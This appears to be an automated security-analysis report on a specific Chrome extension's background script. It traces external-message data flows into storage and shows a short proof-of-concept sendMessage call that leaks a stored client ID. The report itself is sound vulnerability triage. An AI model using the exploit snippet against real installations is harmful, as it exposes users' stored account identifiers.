# CoCo Analysis: gflobokeglbgdhdelipppigfncpnfgbh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gflobokeglbgdhdelipppigfncpnfgbh/opgen_generated_files/bg.js
Line 1034: if (res.font_prefs != null) {
Line 1035: prefs = JSON.parse(res.font_prefs);
Line 1097: if (!!prefs.client && ((!prefs.client.next) || (prefs.client.subs.length != 0 && !prefs.client.next) || (prefs.client.next && prefs.client.next >= Date.now()))) {
Line 1109: resp(prefs.client.id);
```

**Code:**

```javascript
// Background script (bg.js) - Lines 1032-1125
function getPrefs() {
    return chrome.storage.sync.get(["font_prefs"], res => {
        if (res.font_prefs != null) {
            prefs = JSON.parse(res.font_prefs);  // ← Storage data loaded
        }
    });
}

const allowedOrigins = ["https://db.foureyedjimmy.com", "https://dyslexicbrowser.com"];
chrome.runtime.onMessageExternal.addListener(async (req, sender, resp) => {

    if (!allowedOrigins.includes(sender.origin)) {  // Origin check exists but per Rule #1 we ignore
        resp(false);
        return;
    }

    if (!!prefs.client && ((!prefs.client.next) || (prefs.client.subs.length != 0 && !prefs.client.next) || (prefs.client.next && prefs.client.next >= Date.now()))) {
        prefs.client.next = await getNext();
        if (prefs.client.next == null) {
            prefs.client.curr = false;
        }
    }

    switch (req.action) {
        case "give-pdf":
            if (!prefs.client || !prefs.client.curr || !prefs.client.subs.includes("pdf")) {
                resp(null);
                return;
            }
            resp(prefs.client.id);  // ← Sends storage data back via sendResponse
            break;
        // ... other cases
    }
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From malicious extension or whitelisted website (https://db.foureyedjimmy.com or https://dyslexicbrowser.com)
chrome.runtime.sendMessage(
    'gflobokeglbgdhdelipppigfncpnfgbh',  // Extension ID
    { action: "give-pdf" },
    function(response) {
        console.log("Leaked client ID:", response);  // ← Attacker receives stored data
    }
);
```

**Impact:** Complete storage exploitation chain - attacker can read sensitive client.id from storage via external message and receive it back through sendResponse. This is information disclosure of user data stored in chrome.storage.sync.

---

## Sink 2 & 3: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gflobokeglbgdhdelipppigfncpnfgbh/opgen_generated_files/bg.js
Line 1116: prefs.client = req.data;
Line 1117: prefs.client.next = await getNext();
Line 1086: chrome.storage.sync.set({ "font_prefs": JSON.stringify(prefs) });
```

**Code:**

```javascript
// Background script (bg.js) - Lines 1091-1125
chrome.runtime.onMessageExternal.addListener(async (req, sender, resp) => {

    if (!allowedOrigins.includes(sender.origin)) {
        resp(false);
        return;
    }

    switch (req.action) {
        case "update-client":
            prefs.client = req.data;  // ← Attacker-controlled data
            prefs.client.next = await getNext();
            updatePrefs();  // Calls chrome.storage.sync.set
            resp(true);
            break;
    }
})

function updatePrefs() {
    chrome.storage.sync.set({ "font_prefs": JSON.stringify(prefs) });  // ← Sink
}
```

**Classification:** FALSE POSITIVE

**Reason:** This is incomplete storage exploitation. While an external attacker (from whitelisted origins) can write arbitrary data to storage via the "update-client" action, the poisoned data is never retrieved back to the attacker. The attacker can set prefs.client but cannot observe the result or retrieve it through any attacker-accessible output. Storage poisoning without retrieval is NOT exploitable per Critical Rule #2. Note: Even though there's an origin check, per Rule #1 we ignore manifest restrictions - if even ONE domain can exploit it, we analyze it. However, this still fails the retrieval requirement.

---
